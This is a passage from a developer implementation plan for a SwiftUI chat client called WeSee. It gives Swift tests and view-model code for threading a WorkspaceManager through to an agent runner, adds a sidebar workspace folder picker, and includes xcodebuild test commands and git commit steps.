- Modify: `client/WeSee/ViewModels/ChatViewModel.swift`
- Modify: `client/WeSee/ViewModels/SidebarViewModel.swift`
- Modify: `client/WeSeeTests/ChatViewModelTests.swift`

- [ ] **Step 1: Update ChatViewModelTests.swift**

```swift
import Testing
@testable import WeSee

struct ChatViewModelTests {

    @Test func addMessageAppendsToMessages() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.addMessage(content: "Hello", isFromMe: true)
        #expect(viewModel.messages.count == 1)
        #expect(viewModel.messages.first?.content == "Hello")
    }

    @Test func addEmptyMessageIsIgnored() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.addMessage(content: "", isFromMe: true)
        viewModel.addMessage(content: "   ", isFromMe: true)
        #expect(viewModel.messages.isEmpty)
    }

    @Test func addWhitespaceOnlyMessageIsIgnored() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.addMessage(content: "\n\n", isFromMe: true)
        #expect(viewModel.messages.isEmpty)
    }

    @Test func isSendingDisabledBlocksRapidSend() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.sendMessage("msg1")
        #expect(viewModel.isSendingDisabled == true)
    }

    @Test func clearErrorSetsErrorMessageToNil() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.errorMessage = "test error"
        viewModel.clearError()
        #expect(viewModel.errorMessage == nil)
    }

    @Test func sendMessageSetsStreamingContent() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.sendMessage("Hello")
        #expect(viewModel.isStreaming == true)
        #expect(viewModel.streamingContent == "")
    }

    @Test func sendMessageAppendsUserMessage() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.sendMessage("Hello")
        #expect(viewModel.messages.count == 1)
        #expect(viewModel.messages.first?.isFromMe == true)
        #expect(viewModel.messages.first?.content == "Hello")
    }

    @Test func newConversationClearsMessages() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.addMessage(content: "msg1", isFromMe: true)
        viewModel.addMessage(content: "msg2", isFromMe: false)
        viewModel.newConversation()
        #expect(viewModel.messages.isEmpty)
        #expect(viewModel.isStreaming == false)
    }

    @Test func newConversationClearsToolCallResults() {
        let viewModel = ChatViewModel(workspaceManager: WorkspaceManager())
        viewModel.toolCallResults = [
            (id: "1", name: "echo", arguments: [:], result: nil),
        ]
        viewModel.newConversation()
        #expect(viewModel.toolCallResults.isEmpty)
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/ChatViewModelTests`
Expected: BUILD FAIL — ChatViewModel init missing workspaceManager parameter

- [ ] **Step 3: Update ChatViewModel.swift**

Change `init()` to `init(workspaceManager:)` and pass to `AgentRunner`:

```swift
import Foundation
import Observation
import SwiftData

@Observable
final class ChatViewModel {
    var messages: [Message] = []
    var isSendingDisabled: Bool = false
    var errorMessage: String?
    var streamingContent: String = ""
    var isStreaming: Bool = false
    var toolCallResults: [(id: String, name: String, arguments: [String: Any], result: String?)] = []

    private var modelContext: ModelContext?
    private let agentRunner: AgentRunner

    init(workspaceManager: WorkspaceManager) {
        self.agentRunner = AgentRunner(workspaceManager: workspaceManager)
    }

    func configure(with context: ModelContext) {
        self.modelContext = context
        WeSeeLog.info("ChatViewModel configured with ModelContext")
    }

    func fetchMessages() {
        guard let context = modelContext else {
            WeSeeLog.error("ChatViewModel.fetchMessages: modelContext is nil")
            return
        }
        let descriptor = FetchDescriptor<Message>(sortBy: [SortDescriptor(\.timestamp)])
        do {
            messages = try context.fetch(descriptor)
            WeSeeLog.info("ChatViewModel fetched \(messages.count) messages")
        } catch {
            errorMessage = "加载消息失败"
            WeSeeLog.error("ChatViewModel fetchMessages error: \(error.localizedDescription)")
        }
    }

    func addMessage(content: String, isFromMe: Bool) {
        let trimmed = content.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty, trimmed.count <= 5000 else { return }

        let msg = Message(content: trimmed, isFromMe: isFromMe)
        messages.append(msg)

        guard let context = modelContext else { return }
        context.insert(msg)
        try? context.save()
    }

    func newConversation() {
        messages = []
        streamingContent = ""
        isStreaming = false
        toolCallResults = []
    }

    func sendMessage(_ text: String) {
        let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty, trimmed.count <= 5000 else { return }

        addMessage(content: trimmed, isFromMe: true)
        isSendingDisabled = true
        isStreaming = true
        streamingContent = ""
        toolCallResults = []

        WeSeeLog.info("ChatViewModel sending message, history count: \(messages.count)")

        Task {
            let config: ClientConfig
            do {
                config = try ConfigLoader.load()
                WeSeeLog.info("ChatViewModel config loaded: model=\(config.model) baseURL=\(config.baseURL)")
            } catch {
                await MainActor.run {
                    self.errorMessage = error.localizedDescription
                    self.isStreaming = false
                    self.isSendingDisabled = false
                    WeSeeLog.error("ChatViewModel config load error: \(error.localizedDescription)")
                }
                return
            }

            do {
                for try await event in agentRunner.run(
                    history: messages,
                    config: config
                ) {
                    await MainActor.run {
                        switch event {
                        case .token(let token):
                            self.streamingContent += token
                        case .thinking(let text):
                            self.streamingContent += text
                        case .toolCallStart(let id, let name, let arguments):
                            WeSeeLog.info("ChatViewModel toolCallStart: id=\(id) name=\(name)")
                            self.toolCallResults.append(
                                (id: id, name: name, arguments: arguments, result: nil)
                            )
                        case .toolCallResult(let id, let name, let result):
                            WeSeeLog.info("ChatViewModel toolCallResult: id=\(id) name=\(name)")
                            if let index = self.toolCallResults.firstIndex(where: { $0.id == id }) {
                                self.toolCallResults[index].result = result
                            }
                        case .done:
                            WeSeeLog.info("ChatViewModel done, streamingContent length: \(self.streamingContent.count)")
                            let finalContent = self.streamingContent
                            if !finalContent.isEmpty {
                                self.addMessage(content: finalContent, isFromMe: false)
                            }
                            self.streamingContent = ""
                            self.toolCallResults = []
                            self.isStreaming = false
                            self.isSendingDisabled = false
                        case .error(let msg):
                            WeSeeLog.error("ChatViewModel error: \(msg)")
                            self.errorMessage = msg
                            self.isStreaming = false
                            self.toolCallResults = []
                            self.isSendingDisabled = false
                        }
                    }
                }
            } catch {
                await MainActor.run {
                    WeSeeLog.error("ChatViewModel outer error: \(error.localizedDescription)")
                    self.errorMessage = error.localizedDescription
                    self.isStreaming = false
                    self.toolCallResults = []
                    self.isSendingDisabled = false
                }
            }
        }
    }

    func clearError() {
        errorMessage = nil
    }
}
```

- [ ] **Step 4: Update SidebarViewModel.swift**

Add `workspaceManager` property:

```swift
import Foundation
import Observation
import SwiftData

@Observable
final class SidebarViewModel {
    var scheduledTasks: [ScheduledTask] = []
    let workspaceManager: WorkspaceManager

    private var modelContext: ModelContext?

    init(workspaceManager: WorkspaceManager) {
        self.workspaceManager = workspaceManager
    }

    func configure(with context: ModelContext) {
        self.modelContext = context
        fetchScheduledTasks()
    }

    func fetchScheduledTasks() {
        guard let context = modelContext else { return }
        let descriptor = FetchDescriptor<ScheduledTask>(sortBy: [SortDescriptor(\.title)])
        scheduledTasks = (try? context.fetch(descriptor)) ?? []
    }

    func toggleTask(_ task: ScheduledTask) {
        task.isEnabled.toggle()
        try? modelContext?.save()
        fetchScheduledTasks()
    }

    func createTask(type: TaskType, title: String, cronExpression: String) {
        guard let context = modelContext else { return }
        let task = ScheduledTask(type: type, title: title, cronExpression: cronExpression)
        context.insert(task)
        try? context.save()
        fetchScheduledTasks()
    }
}
```

- [ ] **Step 5: Run ChatViewModel tests**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/ChatViewModelTests`
Expected: 9 tests PASS

- [ ] **Step 6: Commit**

```bash
git add client/WeSee/ViewModels/ChatViewModel.swift client/WeSee/ViewModels/SidebarViewModel.swift client/WeSeeTests/ChatViewModelTests.swift
git commit -m "refactor: pass WorkspaceManager through ViewModels to AgentRunner"
```

---

### Task 6: Add workspace UI to Sidebar

**Files:**
- Create: `client/WeSee/Views/Sidebar/WorkspaceSectionView.swift`
- Modify: `client/WeSee/Views/Sidebar/SidebarView.swift`

- [ ] **Step 1: Write WorkspaceSectionView.swift**

```swift
import SwiftUI

struct WorkspaceSectionView: View {
    let workspaceManager: WorkspaceManager
    @State private var showFilePicker = false

    var body: some View {
        VStack(alignment: .leading, spacing: 4) {
            Text("WORKSPACE")
                .font(.caption)
                .foregroundStyle(.secondary)

            Text(workspaceManager.currentURL.path)
                .font(.caption)
                .lineLimit(1)
                .truncationMode(.middle)

            Button("Change...") {
                showFilePicker = true
            }
            .buttonStyle(.link)
            .controlSize(.small)
            .font(.caption)
        }
        .padding(.horizontal, 8)
        .padding(.vertical, 6)
        .fileImporter(
            isPresented: $showFilePicker,
            allowedContentTypes: [.folder],
            allowsMultipleSelection: false
        ) { result in
            if case .success(let urls) = result, let url = urls.first {
                url.startAccessingSecurityScopedResource()
                defer { url.stopAccessingSecurityScopedResource() }
                workspaceManager.update(path: url.path)
            }
        }
    }
}
```

- [ ] **Step 2: Update SidebarView.swift**

Add `WorkspaceSectionView` at the bottom of the sidebar, inside a `VStack`:

```swift
import SwiftUI

struct SidebarView: View {
    let viewModel: SidebarViewModel
    let chatViewModel: ChatViewModel
    @State private var showScheduledTasks = false

    var body: some View {
        VStack(spacing: 0) {
            List {
                Section {
                    FunctionMenuView(
                        onNewConversation: {
                            chatViewModel.newConversation()
                        },
                        onScheduledTasks: {
                            showScheduledTasks = true
                        }
                    )
                    .listRowInsets(EdgeInsets())
                    .listRowBackground(Color.clear)
                }
            }
            .listStyle(.sidebar)

            Divider()

            WorkspaceSectionView(workspaceManager: viewModel.workspaceManager)
        }
        .sheet(isPresented: $showScheduledTasks) {
            ScheduledTaskSheet(viewModel: viewModel)
        }
        .navigationTitle("WeSee")
    }
}
```

- [ ] **Step 3: Update ContentView.swift**

Pass `WorkspaceManager` to `SidebarViewModel` and `ChatViewModel`:

```swift
import SwiftUI
import SwiftData

struct ContentView: View {
    @Environment(\.modelContext) private var modelContext
    @State private var chatViewModel: ChatViewModel
    @State private var sidebarViewModel: SidebarViewModel

    init() {
        let wm = WorkspaceManager()
        _chatViewModel = State(initialValue: ChatViewModel(workspaceManager: wm))
        _sidebarViewModel = State(initialValue: SidebarViewModel(workspaceManager: wm))
    }

    var body: some View {
        NavigationSplitView {
            SidebarView(viewModel: sidebarViewModel, chatViewModel: chatViewModel)
                .frame(minWidth: 220)
        } detail: {
            ChatView(viewModel: chatViewModel)
                .frame(minWidth: 400)
        }
        .onAppear {
            chatViewModel.configure(with: modelContext)
            sidebarViewModel.configure(with: modelContext)
        }
    }
}
```

- [ ] **Step 4: Build and run full test suite**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test`
Expected: All tests PASS, build succeeds

- [ ] **Step 5: Commit**

```bash
git add client/WeSee/Views/Sidebar/WorkspaceSectionView.swift client/WeSee/Views/Sidebar/SidebarView.swift client/WeSee/ContentView.swift
git commit -m "feat: add workspace display and picker to sidebar"
```
